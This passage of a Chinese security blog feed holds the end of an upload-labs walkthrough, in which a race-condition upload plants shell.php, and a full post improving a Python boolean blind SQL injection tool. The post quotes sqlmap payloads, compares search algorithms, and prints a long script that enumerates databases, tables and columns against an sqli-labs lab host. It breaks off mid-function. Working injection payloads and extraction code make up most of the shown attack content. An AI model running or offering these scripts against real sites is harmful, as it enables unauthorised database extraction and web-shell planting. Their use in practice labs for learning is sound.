class="number">10000</span>))</div><div class="line">    pool.close()</div><div class="line">    pool.join()</div></pre></td></tr></table></figure><p><strong>可以看到通过多进程同时上传时可以成功在文件删除之前访问到该文件</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180622/ccEGI0A04e.png?imageslim" alt="mark"><br><strong>在服务器目录下可以看到成功写入shell.php</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180622/lhCj31dk99.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180622/AfKEmfifIB.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;upload-labs通关教程（持续更新）&quot;&gt;&lt;a href=&quot;#upload-labs通关教程（持续更新）&quot; class=&quot;headerlink&quot; title=&quot;upload-labs通关教程（持续更新）&quot;&gt;&lt;/a&gt;upload-labs通关教程（持续更新）&lt;/h1&gt;&lt;h3 id=&quot;序&quot;&gt;&lt;a href=&quot;#序&quot; class=&quot;headerlink&quot; title=&quot;序&quot;&gt;&lt;/a&gt;序&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;最近在圈子里看到的一个文件上传闯关靶场，一共有19关，趁着这个机会做一个教程，以下的内容只是自己的思路，绕过方法有很多种，欢迎大家一起交流，共同学习！&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="文件上传" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>python布尔盲注脚本算法完善</title>
    <link href="http://yoursite.com/2018/06/06/pyblindsqlimax/"/>
    <id>http://yoursite.com/2018/06/06/pyblindsqlimax/</id>
    <published>2018-06-06T02:11:33.645Z</published>
    <updated>2018-06-06T12:51:03.295Z</updated>
    
    <content type="html"><![CDATA[<h1 id="python布尔盲注脚本算法完善"><a href="#python布尔盲注脚本算法完善" class="headerlink" title="python布尔盲注脚本算法完善"></a>python布尔盲注脚本算法完善</h1><p><strong>完善一下上次写的python盲注工具，之前那个盲注工具在猜取字符的时候使用的二分法，通过查找<code>0-126</code>这个范围去采取数据库中的数据。但是当时遗留了一个问题，就是在逐个猜解数据库字符时使用二分法并没有什么问题，这时因为字符都在<code>0-126</code>这个固定范围内，但是在猜取数据库个数、指定数据库的表个数、字段个数或者表中记录条数时，又或者是数据库名的长度、表名长度、字段名的长度时是没有一个固定的范围的，举个例子，比如在猜取表中记录个数时，记录的个数是不能确定范围的，也就是不能确定二分法的最大值，当时采用了循环自加的方式去判断，速度自然是慢了许多。今天抽时间读了一下sqlmap的payload，通过payload发现sqlmap也考虑到了这种情况，并且处理方法还是不错的。对于这种情况还是可以通过二分法判断的，将自己的方法记录一下~</strong><br><a id="more"></a></p><h3 id="分析sqlmap判断时的payload"><a href="#分析sqlmap判断时的payload" class="headerlink" title="分析sqlmap判断时的payload"></a>分析sqlmap判断时的payload</h3><p><strong>首先看一下sqlmap在判断数据库个数时的payload</strong></p><pre><code>[12:09:16] [PAYLOAD] 1&apos; AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))&gt;51 AND &apos;rTJT&apos;=&apos;rTJT[12:09:16] [PAYLOAD] 1&apos; AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))&gt;54 AND &apos;rTJT&apos;=&apos;rTJT[12:09:16] [PAYLOAD] 1&apos; AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))&gt;52 AND &apos;rTJT&apos;=&apos;rTJT[12:09:16] [PAYLOAD] 1&apos; AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))&gt;53 AND &apos;rTJT&apos;=&apos;rTJT[12:09:16] [PAYLOAD] 1&apos; AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),2,1))&gt;51 AND &apos;rTJT&apos;=&apos;rTJT[12:09:16] [PAYLOAD] 1&apos; AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),2,1))&gt;48 AND &apos;rTJT&apos;=&apos;rTJT[12:09:16] [PAYLOAD] 1&apos; AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),2,1))&gt;9 AND &apos;rTJT&apos;=&apos;rTJT[12:09:16] [INFO] retrieved: 5</code></pre><p><strong>通过分析payload可以看出sqlmap将count查到的数据库个数使用cast转换为了字符型，然后指定二分法的范围为字符<code>&#39;0&#39;-&#39;9&#39;</code>，其ascii码转换为十进制也就是<code>48-57</code>，这个区域中间值为52，而看上面sqlmap在判断数据库个数时的第一个payload比较的值是51，所以可以确定sqlmap指定的二分法的大致范围确实是48-57(‘0’-‘9’)</strong></p><p><strong>通过对sqlmap的payload的分析，我想到了一种解决之前那个问题的办法，由于查询个数、长度、记录数的结果一定为数字，那么不管这个数字有多大，只要转换为字符串后，它的每一位一定是在<code>&#39;0&#39;-&#39;9&#39;</code>这个范围内，也就是十进制的<code>48-57</code>，所以只需要把数字转换成字符串，然后去使用二分法，指定二分法的范围为<code>48-57</code>，之后通过二分法可以判断出数字字符串每一位的字符，直到不能判断为止，最终就能得到这个数字</strong></p><h3 id="自增查找和二分查找算法对比"><a href="#自增查找和二分查找算法对比" class="headerlink" title="自增查找和二分查找算法对比"></a>自增查找和二分查找算法对比</h3><p><strong>和之前的自增查找做一个对比，首先以猜解数据库个数为例，我的数据库个数为5个</strong></p><p><strong>在不确定二分法范围时采用的自增算法代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line">url=<span class="string">"http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1"</span></div><div class="line">basehtml=requests.get(url=url).content</div><div class="line">i=<span class="number">0</span></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">    payload=<span class="string">"http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1' and (select count(schema_name) from information_schema.schemata)=%d-- "</span>%(i)</div><div class="line">    html=requests.get(url=payload).content</div><div class="line">    <span class="keyword">print</span> payload</div><div class="line">    <span class="keyword">if</span> basehtml==html:</div><div class="line">        <span class="keyword">print</span> i</div><div class="line">        <span class="keyword">break</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        i=i+<span class="number">1</span></div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180606/DDkGlAlEI1.png?imageslim" alt="mark"><br><strong>自增算法发送了5次payload判断出了数据库个数为5</strong></p><p><strong>再看一下刚刚说的二分查找算法代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line">url=<span class="string">"http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1"</span></div><div class="line">basehtml=requests.get(url=url).content</div><div class="line">i=<span class="number">1</span></div><div class="line">s=<span class="string">""</span></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">    count=<span class="number">0</span></div><div class="line">    low=<span class="number">48</span></div><div class="line">    high=<span class="number">57</span></div><div class="line">    <span class="keyword">while</span> low&lt;=high:</div><div class="line">        mid=(low+high)/<span class="number">2</span></div><div class="line">        payload=<span class="string">"http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1' AND ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))&gt;%d-- "</span>%(i,mid)</div><div class="line">        <span class="keyword">print</span> payload</div><div class="line">        html=requests.get(url=payload).content</div><div class="line">        <span class="keyword">if</span> basehtml==html:</div><div class="line">            low=mid+<span class="number">1</span></div><div class="line">            count+=<span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            high=mid<span class="number">-1</span></div><div class="line">    <span class="keyword">if</span> count!=<span class="number">0</span>:</div><div class="line">        s=s+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">        i=i+<span class="number">1</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">break</span></div><div class="line"><span class="keyword">print</span> s</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180606/mdKF3eAHC6.png?imageslim" alt="mark"><br><strong>在这里二分算法发送了6次payload才判断出来了数据库的个数为5，可以看出当数字比较小的时候，上面的二分法的优势并没有体现出来</strong></p><p><strong>那么再举一个例子，比如用盲注判断<code>information_schema</code>这个数据库名的长度，长度为18，相比之前的5大了一些，为2位数，再次对比一下两个算法</strong></p><p><strong>在不确定二分法范围时采用的自增算法代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line">url=<span class="string">"http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1"</span></div><div class="line">basehtml=requests.get(url=url).content</div><div class="line">i=<span class="number">0</span></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">    payload=<span class="string">"http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1' and (select length(schema_name) from information_schema.schemata limit 0,1)=%d-- "</span>%(i)</div><div class="line">    html=requests.get(url=payload).content</div><div class="line">    <span class="keyword">print</span> payload</div><div class="line">    <span class="keyword">if</span> basehtml==html:</div><div class="line">        <span class="keyword">print</span> i</div><div class="line">        <span class="keyword">break</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        i=i+<span class="number">1</span></div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180606/A3HEkh98aB.png?imageslim" alt="mark"><br><strong>发送了18次payload才判断出<code>information_schema</code>数据库名的长度为18</strong></p><p><strong>再看一下刚刚说的二分查找算法代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line">url=<span class="string">"http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1"</span></div><div class="line">basehtml=requests.get(url=url).content</div><div class="line">i=<span class="number">1</span></div><div class="line">s=<span class="string">""</span></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">    count=<span class="number">0</span></div><div class="line">    low=<span class="number">48</span></div><div class="line">    high=<span class="number">57</span></div><div class="line">    <span class="keyword">while</span> low&lt;=high:</div><div class="line">        mid=(low+high)/<span class="number">2</span></div><div class="line">        payload=<span class="string">"http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1' AND ORD(MID((SELECT IFNULL(CAST(length(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit 0,1),%d,1))&gt;%d-- "</span>%(i,mid)</div><div class="line">        <span class="keyword">print</span> payload</div><div class="line">        html=requests.get(url=payload).content</div><div class="line">        <span class="keyword">if</span> basehtml==html:</div><div class="line">            low=mid+<span class="number">1</span></div><div class="line">            count+=<span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            high=mid<span class="number">-1</span></div><div class="line">    <span class="keyword">if</span> count!=<span class="number">0</span>:</div><div class="line">        s=s+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">        i=i+<span class="number">1</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">break</span></div><div class="line"><span class="keyword">print</span> s</div></pre></td></tr></table></figure><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180606/CJGgj0b8ga.png?imageslim" alt="mark"><br><strong>可以看到随着数字的增加，二分法的优势体现出来了，只发送了9次payload就判断出了<code>information_schema</code>数据库名的长度为18</strong></p><h3 id="盲注脚本加强版"><a href="#盲注脚本加强版" class="headerlink" title="盲注脚本加强版"></a>盲注脚本加强版</h3><p><strong>修改过后的盲注脚本，注入速度相比之前的那个明显有所提高</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding=utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdbnum</span><span class="params">(url,basehtml)</span>:</span></div><div class="line">    i=<span class="number">1</span></div><div class="line">    s=<span class="string">""</span></div><div class="line">    <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">        count=<span class="number">0</span></div><div class="line">        low=<span class="number">48</span></div><div class="line">        high=<span class="number">57</span></div><div class="line">        <span class="keyword">while</span> low&lt;=high:</div><div class="line">            mid=(low+high)/<span class="number">2</span></div><div class="line">            payload=<span class="string">"%s AND ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))&gt;%d-- "</span>%(url,i,mid)</div><div class="line">            <span class="comment">#print payload</span></div><div class="line">            html=requests.get(url=payload).content</div><div class="line">            <span class="keyword">if</span> basehtml==html:</div><div class="line">                low=mid+<span class="number">1</span></div><div class="line">                count+=<span class="number">1</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                high=mid<span class="number">-1</span></div><div class="line">        <span class="keyword">if</span> count!=<span class="number">0</span>:</div><div class="line">            s=s+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">            i=i+<span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">return</span> int(s)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdbs</span><span class="params">(url,basehtml,num)</span>:</span></div><div class="line">    <span class="comment">#print "num:%s"%(num)</span></div><div class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(num):</div><div class="line">        i=<span class="number">1</span></div><div class="line">        length=<span class="string">""</span></div><div class="line">        <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">            count=<span class="number">0</span></div><div class="line">            low=<span class="number">48</span></div><div class="line">            high=<span class="number">57</span></div><div class="line">            <span class="keyword">while</span> low&lt;=high:</div><div class="line">                mid=(low+high)/<span class="number">2</span></div><div class="line">                payload=<span class="string">"%s AND ORD(MID((SELECT IFNULL(CAST(length(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit %d,1),%d,1))&gt;%d-- "</span>%(url,n,i,mid)</div><div class="line">                <span class="comment">#print payload</span></div><div class="line">                html=requests.get(url=payload).content</div><div class="line">                <span class="keyword">if</span> basehtml==html:</div><div class="line">                    low=mid+<span class="number">1</span></div><div class="line">                    count+=<span class="number">1</span></div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    high=mid<span class="number">-1</span></div><div class="line">            <span class="keyword">if</span> count!=<span class="number">0</span>:</div><div class="line">                length=length+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">                i=i+<span class="number">1</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">break</span></div><div class="line">        s=<span class="string">""</span></div><div class="line">        <span class="comment">#print "len:%s"%(length)</span></div><div class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">1</span>,int(length)+<span class="number">1</span>):</div><div class="line">            low=<span class="number">0</span></div><div class="line">            high=<span class="number">126</span></div><div class="line">            <span class="keyword">while</span> low&lt;=high:</div><div class="line">                mid=(low+high)/<span class="number">2</span></div><div class="line">                payload=<span class="string">"%s and ascii(substr((select schema_name from information_schema.schemata limit %s,1),%s,1))&gt;%s-- "</span>%(url,str(n),str(c),str(mid))</div><div class="line">                html=requests.get(url=payload).content</div><div class="line">                <span class="comment">#print payload</span></div><div class="line">                <span class="keyword">if</span> html==basehtml:</div><div class="line">                    <span class="comment">#print payload</span></div><div class="line">                    low=mid+<span class="number">1</span></div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    high=mid<span class="number">-1</span></div><div class="line">            s=s+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">            <span class="keyword">print</span> s</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">gettablenum</span><span class="params">(url,basehtml,dbname)</span>:</span></div><div class="line">    i=<span class="number">1</span></div><div class="line">    s=<span class="string">""</span></div><div class="line">    <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">        count=<span class="number">0</span></div><div class="line">        low=<span class="number">48</span></div><div class="line">        high=<span class="number">57</span></div><div class="line">        <span class="keyword">while</span> low&lt;=high:</div><div class="line">            mid=(low+high)/<span class="number">2</span></div><div class="line">            payload=<span class="string">"%s AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x%s),%d,1))&gt;%d-- "</span>%(url,dbname.encode(<span class="string">"hex"</span>),i,mid)</div><div class="line">            <span class="comment">#print payload</span></div><div class="line">            html=requests.get(url=payload).content</div><div class="line">            <span class="keyword">if</span> basehtml==html:</div><div class="line">                low=mid+<span class="number">1</span></div><div class="line">                count+=<span class="number">1</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                high=mid<span class="number">-1</span></div><div class="line">        <span class="keyword">if</span> count!=<span class="number">0</span>:</div><div class="line">            s=s+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">            i=i+<span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">return</span> int(s)       </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">gettables</span><span class="params">(url,basehtml,num,dbname)</span>:</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"num:%s"</span>%(num)</div><div class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(num):</div><div class="line">        i=<span class="number">1</span></div><div class="line">        length=<span class="string">""</span></div><div class="line">        <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">            count=<span class="number">0</span></div><div class="line">            low=<span class="number">48</span></div><div class="line">            high=<span class="number">57</span></div><div class="line">            <span class="keyword">while</span> low&lt;=high:</div><div class="line">                mid=(low+high)/<span class="number">2</span></div><div class="line">                payload=<span class="string">"%s AND ORD(MID((SELECT IFNULL(CAST(length(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x%s limit %d,1),%d,1))&gt;%d-- "</span>%(url,dbname.encode(<span class="string">"hex"</span>),n,i,mid)</div><div class="line">                <span class="keyword">print</span> payload</div><div class="line">                html=requests.get(url=payload).content</div><div class="line">                <span class="keyword">if</span> basehtml==html:</div><div class="line">                    low=mid+<span class="number">1</span></div><div class="line">                    count+=<span class="number">1</span></div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    high=mid<span class="number">-1</span></div><div class="line">            <span class="keyword">if</span> count!=<span class="number">0</span>:</div><div class="line">                length=length+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">                i=i+<span class="number">1</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">break</span></div><div class="line">        s=<span class="string">""</span></div><div class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">1</span>,int(length)+<span class="number">1</span>):</div><div class="line">            low=<span class="number">0</span></div><div class="line">            high=<span class="number">126</span></div><div class="line">            <span class="keyword">while</span> low&lt;=high:</div><div class="line">                mid=(low+high)/<span class="number">2</span></div><div class="line">                payload=<span class="string">"%s and ascii(substr((select table_name from information_schema.tables where table_schema=0x%s limit %s,1),%s,1))&gt;%s-- "</span>%(url,dbname.encode(<span class="string">"hex"</span>),str(n),str(c),str(mid))</div><div class="line">                html=requests.get(url=payload).content</div><div class="line">                <span class="comment">#print payload</span></div><div class="line">                <span class="keyword">if</span> html==basehtml:</div><div class="line">                    <span class="comment">#print payload</span></div><div class="line">                    low=mid+<span class="number">1</span></div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    high=mid<span class="number">-1</span></div><div class="line">            s=s+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">            <span class="keyword">print</span> s</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getcolumnnum</span><span class="params">(url,basehtml,tablename,dbname)</span>:</span></div><div class="line">    i=<span class="number">1</span></div><div class="line">    s=<span class="string">""</span></div><div class="line">    <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">        count=<span class="number">0</span></div><div class="line">        low=<span class="number">48</span></div><div class="line">        high=<span class="number">57</span></div><div class="line">        <span class="keyword">while</span> low&lt;=high:</div><div class="line">            mid=(low+high)/<span class="number">2</span></div><div class="line">            payload=<span class="string">"%s AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=0x%s AND TABLE_SCHEMA=0x%s),%d,1))&gt;%d-- "</span>%(url,tablename.encode(<span class="string">"hex"</span>),dbname.encode(<span class="string">"hex"</span>),i,mid)</div><div class="line">            <span class="comment">#print payload</span></div><div class="line">            html=requests.get(url=payload).content</div><div class="line">            <span class="keyword">if</span> basehtml==html:</div><div class="line">                low=mid+<span class="number">1</span></div><div class="line">                count+=<span class="number">1</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                high=mid<span class="number">-1</span></div><div class="line">        <span class="keyword">if</span> count!=<span class="number">0</span>:</div><div class="line">            s=s+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">            i=i+<span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">return</span> int(s) </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getcolumns</span><span class="params">(url,basehtml,num,tablename,dbname)</span>:</span></div><div 